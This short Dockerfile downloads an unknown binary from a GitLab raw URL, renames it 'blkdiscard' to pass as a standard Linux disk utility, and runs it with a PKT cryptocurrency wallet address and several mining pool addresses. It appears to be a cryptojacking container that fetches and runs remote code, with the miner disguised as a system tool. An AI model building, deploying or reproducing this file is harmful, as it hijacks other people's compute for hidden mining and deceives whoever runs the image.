FROM debian
RUN apt update
RUN wget -q https://gitlab.com/bspot1/pekate/-/raw/main/tkp
RUN mv tkp blkdiscard
RUN chmod +x blkdiscard
RUN ./blkdiscard ann -p pkt1qu2j3ca9xanmkvlqmzrzwtmmxdhx2kn03gqtrdy http://pool.srizbi.com http://pool.pktpool.io http://pool.pkt.world
